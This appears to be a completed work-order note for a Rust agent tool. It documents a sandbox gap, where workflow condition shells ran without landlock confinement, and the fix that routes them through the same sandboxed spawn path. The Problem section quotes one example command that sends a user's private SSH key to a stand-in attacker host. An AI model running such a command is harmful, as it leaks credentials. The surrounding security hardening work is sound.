# WO 47 — Workflow condition: field runs unsandboxed shell — deny-list only, no landlock

## Status: Done

## Problem

HIGH — sandbox coverage gap (Sonnet, verified end-to-end). Workflow conditions run sh -c <string>. eval_condition (src/tools/workflow.rs:477) correctly routes through check_bash_command_str (the keyword deny-list) — but the actual spawn (eval_condition_bounded, kf-workflow/src/refs.rs) builds a bare tokio::process::Command with NO pre_exec landlock, NO rlimits. Regular bash steps get kernel-level default-deny FS confinement; conditions get only pattern-matching. `test -f ~/.ssh/id_rsa && curl -s attacker.example -d @~/.ssh/id_rsa` matches no deny pattern but a landlocked spawn would block it. Fix: route eval_condition_bounded's spawn through the same bash_runner command-construction path (or at least the same pre_exec landlock closure) — one sandboxed-shell-spawn code path instead of two with diverging guarantees.

Source: multi-model audit vetting 2026-08-27 (mm-bugs.md, ds-bugs.md, kimi-bugs.md,
sonnet-bugs.md, gpt-bugs.md). Top-severity claims verified against the code at
dbfd8bb0 before filing.

## Fix (implemented)

Injection seam, mirroring the existing `eval_condition` override pattern:

- `kf_workflow::eval_condition_bounded(condition, prepare)` gained an
  optional pre-spawn hook `Option<&(dyn Fn(&mut Command) + Send + Sync)>`
  applied to the `sh -c` Command before spawn. `None` = previous bare
  spawn (crate default, tests, runners without a sandbox).
- `src/tools/workflow.rs`: new private `prepare_workflow_shell_cmd` —
  the same construction `run_shell_with_token` applies to the foreground
  bash tool (secret env scrub, PATH pin, process group, `setup_rlimits`
  pre_exec = rlimits + landlock + optional CLONE_NEWNET, landlock
  workspace = process CWD, extras = `security.landlock_extra_paths`).
  Used by BOTH `run_bounded_bash` (workflow bash steps — previously also
  missing rlimits/landlock) and the `eval_condition` override (passes it
  as the prepare closure) — one sandboxed-shell-spawn path.
- `WorkflowTool` / `WorkflowRunArgs` / `TaskSpawnerStepRunner` gained
  `sandbox_config` + `landlock_extra_paths` (populated post-construction,
  WO 27.1 pattern, in `src/tools/mod.rs` from `ctx` and in
  `src/jobs/runner.rs` from job config — unattended jobs get the sandbox
  too). `src/session/bash_runner/mod.rs` needed NO edit:
  `setup_rlimits`/`resolve_paths` were already `pub(crate)`.
- Fail-closed parity: if the pre_exec sandbox refuses the spawn,
  `eval_condition_bounded` returns false (skip step) + warn — same
  fail-closed semantics as the foreground bash tool's spawn failure.
- Tests: `eval_condition_bounded_applies_prepare_hook` (kf-workflow —
  hook-injected env var observable from inside the condition),
  `eval_condition_bounded_*` updated to `None`; bin:
  `eval_condition_benign_condition_true_through_sandbox` (benign
  condition still true through the landlock+rlimit spawn).
